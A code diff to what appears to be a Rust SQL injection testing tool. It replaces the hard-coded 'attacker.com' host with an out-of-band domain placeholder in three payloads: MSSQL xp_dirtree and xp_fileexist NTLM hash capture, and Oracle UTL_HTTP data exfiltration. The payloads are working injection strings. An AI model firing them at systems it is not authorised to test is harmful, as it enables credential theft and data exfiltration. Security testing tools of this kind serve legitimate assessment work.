@@ -84,15 +84,15 @@ impl OsCommandPayloads {
                 returns_output: false,
             },
             OsExecPayload {
-                payload: "'; EXEC xp_dirtree '\\\\attacker.com\\share'-- ".to_string(),
-                description: "MSSQL xp_dirtree UNC NTLM capture",
+                payload: "'; EXEC xp_dirtree '\\\\{{OOB_DOMAIN}}\\share'-- ".to_string(),
+                description: "MSSQL xp_dirtree UNC NTLM capture (requires --oob-domain)",
                 dbms: "MSSQL",
                 required_privilege: "public",
                 returns_output: false,
             },
             OsExecPayload {
-                payload: "'; EXEC xp_fileexist '\\\\attacker.com\\share\\x'-- ".to_string(),
-                description: "MSSQL xp_fileexist UNC NTLM capture",
+                payload: "'; EXEC xp_fileexist '\\\\{{OOB_DOMAIN}}\\share\\x'-- ".to_string(),
+                description: "MSSQL xp_fileexist UNC NTLM capture (requires --oob-domain)",
                 dbms: "MSSQL",
                 required_privilege: "public",
                 returns_output: false,
@@ -235,10 +235,10 @@ impl OsCommandPayloads {
             OsExecPayload {
                 payload: format!(
                     "'; DECLARE r VARCHAR2(1000); \
-                     BEGIN r:=UTL_HTTP.REQUEST('http://attacker.com/'||{}); END;-- ",
+                     BEGIN r:=UTL_HTTP.REQUEST('http://{{OOB_DOMAIN}}/'||{}); END;-- ",
                     cmd
                 ),
-                description: "Oracle UTL_HTTP OOB exfil",
+                description: "Oracle UTL_HTTP OOB exfil (requires --oob-domain)",
                 dbms: "Oracle",
                 required_privilege: "EXECUTE on UTL_HTTP",
                 returns_output: false,
